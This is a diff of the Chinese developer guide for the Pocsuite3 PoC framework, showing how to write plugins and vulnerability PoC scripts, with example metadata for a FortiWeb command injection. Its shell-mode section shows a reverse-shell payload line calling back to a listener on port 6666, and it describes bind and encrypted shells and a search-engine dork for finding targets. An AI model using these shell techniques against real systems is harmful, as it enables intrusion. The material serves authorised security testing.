@@ -1,21 +1,21 @@
-pocsuite3 开发文档及 PoC 编写规范及要求说明
+Pocsuite3 开发文档及 PoC 编写规范及要求说明
 ---
 * [概述](#overview)
-* [插件 编写规范](#write_plugin)
+* [插件编写规范](#write_plugin)
   * [TARGETS 类型插件](#plugin_targets)
   * [POCS 类型插件](#plugin_pocs)
   * [RESULTS 类型插件](#plugin_results)
-* [PoC 脚本编写规范](#write_poc)
-  * [PoC python脚本编写步骤](#pocpy)
-  * [可自定义参数的插件](#可自定义参数的插件<div-id="plugin_div"></div>)
+* [PoC 编写规范](#write_poc)
+  * [PoC python 脚本编写步骤](#pocpy)
+  * [可自定义参数的 PoC](#可自定义参数的插件<div-id="plugin_div"></div>)
   * [PoC 编写注意事项](#attention)
-  * [Pocsuite 远程调用文件列表](#inclue_files)
+  * [Pocsuite3 远程调用文件列表](#inclue_files)
   * [通用API列表](#common_api)
     * [通用方法](#api_common)
     * [参数调用](#api_params)
   * [PoC 代码示例](#PoCexample)
     * [PoC Python 代码示例](#pyexample)
-* [pocsuite3 集成调用](#pocsuite_import)
+* [Pocsuite3 集成调用](#pocsuite_import)
 * [PoC 规范说明](#PoCstandard)
   * [PoC 编号说明](#idstandard)
   * [PoC 命名规范](#namedstandard)
@@ -27,10 +27,10 @@ pocsuite3 开发文档及 PoC 编写规范及要求说明
 
 
 ### 概述<div id="overview"></div>
- 本文档为 Pocsuite3 插件及 PoC 脚本编写规范及要求说明，包含了插件、PoC 脚本编写的步骤以及相关 API 的一些说明。一个优秀的 PoC 离不开反复的调试、测试，在阅读本文档前，请先阅读 [《Pocsuite 使用文档》](./USAGE.md)。或参考 https://paper.seebug.org/904/ 查看 pocsuite3 的一些新特性。
+ 本文档为 Pocsuite3 插件及 PoC 脚本编写规范及要求说明，包含了插件、PoC 脚本编写的步骤以及相关 API 的一些说明。一个优秀的 PoC 离不开反复的调试、测试，在阅读本文档前，请先阅读 [《Pocsuite3 使用文档》](./USAGE.md)。或参考 https://paper.seebug.org/904/ 查看 Pocsuite3 的一些新特性。
 
 ### 插件编写规范<div id="write_plugin"></div>
-pocsuite3 共有三种类型的插件，定义在 `pocsuite3.lib.core.enums.PLUGIN_TYPE` 中。
+Pocsuite3 共有三种类型的插件，定义在 `pocsuite3.lib.core.enums.PLUGIN_TYPE` 中。
 
 #### TARGETS 类型插件<div id="plugin_targets"></div>
 TARGETS 类型插件用来自定义在系统初始化时候加载检测目标的功能，例如从 redis 或数据库加载 targets
@@ -115,7 +115,7 @@ register_plugin(HtmlReport)
 
 ```
 
-若需要实时的保存结果，需要在申明 `handle` 来处理，可参考 https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/plugins/file_record.py 的写法。
+若需要实时的保存结果，需要申明 `handle` 来处理，可参考 https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/plugins/file_record.py 的写法。
 
 ### PoC 编写规范<div id="write_poc"></div>
 
@@ -123,7 +123,7 @@ register_plugin(HtmlReport)
 
 本小节介绍 PoC python 脚本编写
 
-pocsuite3 仅支持 Python 3.x，如若编写 Python3 格式的 PoC，需要开发者具备一定的 Python3 基础
+Pocsuite3 仅支持 Python 3.x，如若编写 Python3 格式的 PoC，需要开发者具备一定的 Python3 基础
 
 1. 首先新建一个 `.py` 文件，文件名应当符合 [《PoC 命名规范》](#namedstandard)
 
@@ -140,27 +140,27 @@ from pocsuite3.lib.utils import random_str
     ...
 ```
 
-3. 填写 PoC 信息字段，**要求认真填写所有基本信息字段**
+3. 填写 PoC 信息字段，**请认真填写所有基本信息字段**
 ```python
-    vulID = '1571'  # ssvid ID 如果是提交漏洞的同时提交 PoC，则写成 0
-    version = '1'  # 默认为1
-    author = 'seebug'  # PoC 作者的大名
-    vulDate = '2014-10-16'  # 漏洞公开的时间，不知道就写今天
-    createDate = '2014-10-16'  # 编写 PoC 的日期
-    updateDate = '2014-10-16'  # PoC 更新的时间，默认和编写时间一样
-    references = ['https://www.sektioneins.de/en/blog/14-10-15-drupal-sql-injection-vulnerability.html']  # 漏洞地址来源，0day 不用写
-    name = 'Drupal 7.x /includes/database/database.inc SQL注入漏洞 PoC'  # PoC 名称
-    appPowerLink = 'https://www.drupal.org/'  # 漏洞厂商主页地址
-    appName = 'Drupal'  # 漏洞应用名称
-    appVersion = '7.x'  # 漏洞影响版本
-    vulType = 'SQL Injection'  # 漏洞类型，类型参考见漏洞类型规范表
-    desc = '''
-        Drupal 在处理 IN 语句时，展开数组时 key 带入 SQL 语句导致 SQL 注入，
-        可以添加管理员、造成信息泄露。
-    ''' # 漏洞简要描述
-    samples = []  # 测试样列，就是用 PoC 测试成功的网站
-    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
+    vulID = '99335'  # Seebug 漏洞收录ID，如果没有则为0
+    version = '1'  # PoC 的版本，默认为1
+    author = 'seebug'  # PoC 的作者
+    vulDate = '2021-8-18'  # 漏洞公开日期 (%Y-%m-%d)
+    createDate = '2021-8-20'  # PoC 编写日期 (%Y-%m-%d)
+    updateDate = '2021-8-20'  # PoC 更新日期 (%Y-%m-%d)
+    references = ['https://www.seebug.org/vuldb/ssvid-99335']  # 漏洞来源地址，0day 不用写
+    name = 'Fortinet FortiWeb 授权命令执行 (CVE-2021-22123)'  # PoC 名称，建议命令方式：<厂商> <组件> <版本> <漏洞类型> <cve编号>
+    appPowerLink = 'https://www.fortinet.com'  # 漏洞厂商主页地址
+    appName = 'FortiWeb'  # 漏洞应用名称
+    appVersion = '<=6.4.0'  # 漏洞影响版本
+    vulType = 'Code Execution'  # 漏洞类型，参见漏洞类型规范表
+    desc = '/api/v2.0/user/remoteserver.saml接口的name参数存在命令注入'  # 漏洞简要描述
+    samples = ['http://192.168.1.1']  # 测试样列，就是用 PoC 测试成功的目标
+    install_requires = ['BeautifulSoup4:bs4']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    	pocDesc = ''' poc的用法描述 '''
+    dork = {'zoomeye': 'deviceState.admin.hostname'}  # 搜索 dork，如果运行 PoC 时不提供目标且该字段不为空，将会调用插件从搜索引擎获取目标。
+    suricata_request = '''http.uri; content: "/api/v2.0/user/remoteserver.saml";'''  # 请求流量 suricata 规则
+    suricata_response = ''  # 响应流量 suricata 规则
 ```
 
 4. 编写验证模式
@@ -192,7 +192,7 @@ def _attack(self):
 
 6. 编写shell模式 [**new**]
 
-pocsuite3 在 shell 模式会默认监听 `6666` 端口，编写对应的攻击代码，让目标执行反向连接运行 pocsuite3 系统 IP 的 `6666` 端口即可得到一个 shell
+Pocsuite3 在 shell 模式会默认监听 `6666` 端口，编写对应的攻击代码，让目标执行反向连接运行 Pocsuite3 系统 IP 的 `6666` 端口即可得到一个 shell
 ```python
 def _shell(self):
     cmd = REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port())
@@ -201,7 +201,7 @@ def _shell(self):
 
 shell 模式下，只能运行单个 PoC 脚本，控制台会进入 shell 交互模式执行命令及输出
 
-从 ***1.8.5*** 版本开始，pocsuite3 支持 bind shell。shell 模式和原来的操作方式一致，也需要指定监听 ip 和端口，监听 ip 可以是本地任意 ip，也可以是远程 vps ip。
+从 ***1.8.5*** 版本开始，Pocsuite3 支持 bind shell。shell 模式和原来的操作方式一致，也需要指定监听 ip 和端口，监听 ip 可以是本地任意 ip，也可以是远程 vps ip。
 
 bind shell 的实现位于 `./pocsuite3/modules/listener/bind_tcp.py`，原理是实现了一个中间层，一端连接漏洞目标的 bind shell（如 telnet 服务、nc 启动的 shell、php 一句话等），另一端连接用户指定的监听 ip 和端口，如此一来，shell 模式可以不受网络环境限制，支持在内网使用。
 
@@ -213,7 +213,7 @@ bind shell 的实现位于 `./pocsuite3/modules/listener/bind_tcp.py`，原理�
 
 `bind_telnet_shell`：对 telnet 服务的原生支持，在 shell 模式中 `return bind_telnet_shell(ip, port, username, password)`
 
-从 ***1.8.6*** 版本开始，pocsuite3 支持加密的 shell。PoC 中使用 openssl 的反弹命令（也可以用代码反弹），并且在运行时指定 `--tls` 选项。
+从 ***1.8.6*** 版本开始，Pocsuite3 支持加密的 shell。PoC 中使用 openssl 的反弹命令（也可以用代码反弹），并且在运行时指定 `--tls` 选项。
 
 7. 结果返回
 
@@ -233,7 +233,7 @@ bind shell 的实现位于 `./pocsuite3/modules/listener/bind_tcp.py`，原理�
 }
 ```
 
-output 为 Pocsuite 标准输出 API，如果要输出调用成功信息则使用 `output.success(result)`，如果要输出调用失败则 `output.fail()`，系统自动捕获异常，不需要 PoC 里处理捕获，如果 PoC 里使用 try...except 来捕获异常，可通过`output.error('Error Message')` 来传递异常内容，建议直接使用模板中的 parse_output 通用结果处理函数对 _verify 和 _attack 结果进行处理。
+output 为 Pocsuite3 标准输出 API，如果要输出调用成功信息则使用 `output.success(result)`，如果要输出调用失败则 `output.fail()`，系统自动捕获异常，不需要 PoC 里处理捕获，如果 PoC 里使用 try...except 来捕获异常，可通过`output.error('Error Message')` 来传递异常内容，建议直接使用模板中的 parse_output 通用结果处理函数对 _verify 和 _attack 结果进行处理。
 ```
 def _verify(self, verify=True):
     result = {}
@@ -272,9 +272,9 @@ from pocsuite3.api import OptString
 
 
 class DemoPOC(POCBase):
-    vulID = '00000'  # ssvid
+    vulID = '0'  # ssvid
     version = '1.0'
-    author = ['knownsec.com']
+    author = ['seebug']
     vulDate = '2019-2-26'
     createDate = '2019-2-26'
     updateDate = '2019-2-25'
@@ -322,7 +322,7 @@ register_poc(DemoPOC)
 
 它可以使你在 `console` 或者 `cli` 模式下调用。
 
-- 在 console 模式下，pocsuite3 模仿了 msf 的操作模式，你只需要使用 `set` 命令来设置相应的参数，然后 `run` 或者 `check` 来执行(`attack` 和 `shell` 命令也可以)。
+- 在 console 模式下，Pocsuite3 模仿了 msf 的操作模式，你只需要使用 `set` 命令来设置相应的参数，然后 `run` 或者 `check` 来执行(`attack` 和 `shell` 命令也可以)。
 - 在 cli 模式下，如上面例子所示，定义了 `username` 和 `password` 两个字段，你可以在参数后面加上 `--username test --password test` 来调用执行，需要注意的是，如果你的参数中包含了空格，用双引号 `"` 来包裹它。
 
 ##### 自定义字段
@@ -335,7 +335,7 @@ from pocsuite3.api import OptString, OptDict, OptIP, OptPort, OptBool, OptIntege
 
 | 字段类型   | 字段描述                                                     | 参数解释                                                     | 相关例子 |
 | ---------- | ------------------------------------------------------------ | ------------------------------------------------------------ | -------- |
-| OptString  | 接收字符串类型数据                                           | default: 传入一个默认值<br />descript: 字段描述，默认为空<br />require: 是否必须，默认False |          |
+| OptString  | 接收字符串类型参数                                           | default: 传入一个默认值<br />descript: 字段描述，默认为空<br />require: 是否必须，默认False |          |
 | OptDict    | 接收一个字典类型参数，在选择上如果选择key，调用时会调用对应的value | default: 传入一个默认值<br />descript: 字段描述，默认为空<br />require: 是否必须，默认False |          |
 | OptIP      | 接收IP类型的字符串                                           | default: 传入一个默认值<br />descript: 字段描述，默认为空<br />require: 是否必须，默认False |          |
 | OptPort    | 接收端口类型参数                                             | default: 传入一个默认值<br />descript: 字段描述，默认为空<br />require: 是否必须，默认False |          |
@@ -348,8 +348,8 @@ from pocsuite3.api import OptString, OptDict, OptIP, OptPort, OptBool, OptIntege
 
 #### PoC 编写注意事项<div id="attention"></div>
 1. 要求在编写 PoC 的时候，尽量的不要使用第三方模块，如果在无法避免的情况下，请认真填写 install_requires 字段，填写格式参考《PoC 第三方模块依赖说明》。
-2. 要求编写 PoC 的时候，尽量的使用 Pocsuite 已经封装的 API 提供的方法，避免自己重复造轮子，对于一些通用方法可以加入到 API，具体参考《通用 API 列表》。
-3. 如果 PoC 需要包含远程文件等，统一使用 Pocsuite 远程调用文件，具体可以参考[《Pocsuite 远程调用文件列表》](#inclue_files)，不要引入第三方文件，如果缺少对应文件，联系管理员添加。
+2. 要求编写 PoC 的时候，尽量的使用 Pocsuite3 已经封装的 API 提供的方法，避免自己重复造轮子，对于一些通用方法可以加入到 API，具体参考《通用 API 列表》。
+3. 如果 PoC 需要包含远程文件等，统一使用 Pocsuite3 远程调用文件，具体可以参考[《Pocsuite3 远程调用文件列表》](#inclue_files)，不要引入第三方文件，如果缺少对应文件，联系管理员添加。
 4. 要求每个 PoC 在编写的时候，尽可能的不要要求输入参数，这样定制化过高，不利于 PoC 的批量化调度执行，尽可能的 PoC 内部实现参数的构造，至少应该设置默认值，如某个 PoC 需要指定用户id，那么应该允许使用 extar_param 传入 id，也应该没有传入该参数的时候自动设置默认值，不应该影响 PoC 的正常运行与验证。
 5. 要求每个 PoC 在输出结果的时候，尽可能的在不破坏的同时输出取证信息，如输出进程列表，具体参考[《PoC 结果返回规范》](#resultstandard)。
 6. 要求认真填写 PoC 信息字段，其中 vulID 请填写 Seebug 上的漏洞 ID（不包含 SSV-）。
@@ -391,10 +391,10 @@ from pocsuite3.api import OptString, OptDict, OptIP, OptPort, OptBool, OptIntege
 8. 任意文件如果需要知道网站路径才能读取文件的话，可以读取系统文件进行验证，要写 Windows 版和 Linux 版两个版本。
 9. 检测模式下，上传的文件一定要删掉。
 10. 程序可以通过某些方法获取表前缀，just do it；若不行，保持默认表前缀。
-11. PoC 编写好后，务必进行测试，测试规则为：5 个不受漏洞的网站，确保 PoC 攻击不成功；5 个受漏洞影响的网站，确保 PoC 攻击成功
+11. PoC 编写好后，务必进行测试，测试规则为：5 个不受漏洞影响的网站，确保 PoC 攻击不成功；5 个受漏洞影响的网站，确保 PoC 攻击成功
 
 #### Pocsuite3 远程调用文件列表<div id="inclue_files"></div>
-部分 PoC 需要采用包含远程文件的形式，要求基于 Pocsuite3 的 PoC 统一调用统一文件(如需引用未在以下文件列表内文件，请联系 s1@seebug.org 或者直接提交 issue)。
+部分 PoC 需要采用包含远程文件的形式，要求基于 Pocsuite3 的 PoC 统一调用统一文件(如需引用未在以下文件列表内文件，请联系 404-team@knownsec.com 或者直接提交 issue)。
 统一 URL 调用路径：`http://pocsuite.org/include_files/`，如 `http://pocsuite.org/include_files/xxe_verify.xml`
 
 **文件列表**
@@ -427,9 +427,9 @@ from pocsuite3.api import OptString, OptDict, OptIP, OptPort, OptBool, OptIntege
 
 **参数调用**<div id="api_params"></div>
 
-* self.headers 用来获取 http 请求头， 可以通过 --cookie， --referer， --user-agent， --headers 来修改和增加需要的部分
-* self.params 用来获取 --extra-params 赋值的变量，Pocsuite 会自动转化成字典格式，未赋值时为空字典
-* self.url 用来获取 -u / --url 赋值的 URL，如果之前赋值是 baidu.com 这样没有协议的格式时， Pocsuite 会自动转换成 http:// baidu.com
+* self.headers 用来获取 http 请求头， 可以通过 --cookie, --referer，--user-agent，--headers 来修改和增加需要的部分
+* self.params 用来获取 --extra-params 赋值的变量，Pocsuite3 会自动转化成字典格式，未赋值时为空字典
+* self.url 用来获取 -u / --url 赋值的 URL，如果之前赋值是 baidu.com 这样没有协议的格式时， Pocsuite3 会自动转换成 http://baidu.com
 
 ##### ShellCode 生成支持
 
@@ -653,9 +653,9 @@ register_poc(DemoPOC)
 ```
 
 
-### pocsuite3 集成调用<div id="pocsuite_import"></div>
+### Pocsuite3 集成调用<div id="pocsuite_import"></div>
 
-pocsuite3 api 提供了集成调用` pocsuite3` 的全部功能函数，可参见测试用例 `tests/test_import_pocsuite_execute.py`。典型的集成调用方法如下：
+Pocsuite3 api 提供了集成调用` pocsuite3` 的全部功能函数，可参见测试用例 `tests/test_import_pocsuite_execute.py`。典型的集成调用方法如下：
 
 ```python
 from pocsuite3.api import init_pocsuite
@@ -820,6 +820,7 @@ result：[
     <tr><td>Arbitrary File Creation </td><td> 任意文件创建 </td><td> file-creation</td></tr>
     <tr><td>Arbitrary File Download </td><td> 任意文件下载 </td><td> file-download</td></tr>
     <tr><td>Arbitrary File Deletion </td><td> 任意文件删除 </td><td> file-deletion</td></tr>
+    <tr><td>Arbitrary File Read </td><td> 任意文件读取 </td><td> file-read</td></tr>
     <tr><td>Backup File Found </td><td> 备份文件发现 </td><td> bak-file-found</td></tr>
     <tr><td>Database Found </td><td> 数据库发现 </td><td> db-found</td></tr>
     <tr><td>Directory Listing </td><td> 目录遍历 </td><td> dir-listing</td></tr>
@@ -835,7 +836,25 @@ result：[
     <tr><td>Malware </td><td> 挂马 </td><td> mal</td></tr>
     <tr><td>Black Link </td><td> 暗链 </td><td> black-link</td></tr>
     <tr><td>Backdoor </td><td> 后门 </td><td> backdoor</td></tr>
-
+    <tr><td>Insecure Cookie Handling </td><td> 不安全的Cookie </td><td> insecure-cookie-handling</td></tr>
+    <tr><td>Shellcode </td><td> Shellcode </td><td> shellcode</td></tr>
+    <tr><td>Variable Coverage </td><td> 变量覆盖 </td><td> variable-coverage</td></tr>
+    <tr><td>Injecting Malware Codes </td><td> 恶意代码注入 </td><td> injecting-malware-codes</td></tr>
+    <tr><td>Upload Files </td><td> 文件上传 </td><td> upload-files</td></tr>
+    <tr><td>Local Overflow </td><td> 本地溢出 </td><td> local-overflow</td></tr>
+    <tr><td>Path Traversal </td><td> 目录穿越 </td><td> path-traversal</td></tr>
+    <tr><td>Unauthorized Access </td><td> 未授权访问 </td><td> unauth-access</td></tr>
+    <tr><td>Remote Overflow </td><td> 远程溢出 </td><td> remote-overflow</td></tr>
+    <tr><td>Man-in-the-middle </td><td> 中间人攻击 </td><td> mitm</td></tr>
+    <tr><td>Out of Memory </td><td> 内存溢出 </td><td> out-of-memory</td></tr>
+    <tr><td>Buffer Over-read </td><td> 缓冲区越界读 </td><td> buffer-over-read</td></tr>
+    <tr><td>Backup File Found </td><td> 备份文件泄漏 </td><td> backup-file-found</td></tr>
+    <tr><td>Use After Free </td><td> 释放后使用 </td><td> uaf</td></tr>
+    <tr><td>DNS Hijacking </td><td> DNS劫持 </td><td> dns-hijacking</td></tr>
+    <tr><td>Improper Input Validation </td><td> 不正确的输入校验 </td><td> improper-input-validation</td></tr>
+    <tr><td>Universal Cross-site Scripting </td><td> 通用型XSS </td><td> uxss</td></tr>
+    <tr><td>Server-Side Request Forgery </td><td> 服务器端请求伪造 </td><td> ssrf</td></tr>
+    <tr><td>Other </td><td> 其他 </td><td> other</td></tr>
 </table>
 
 也可以参见[漏洞类型规范](http://seebug.org/category)
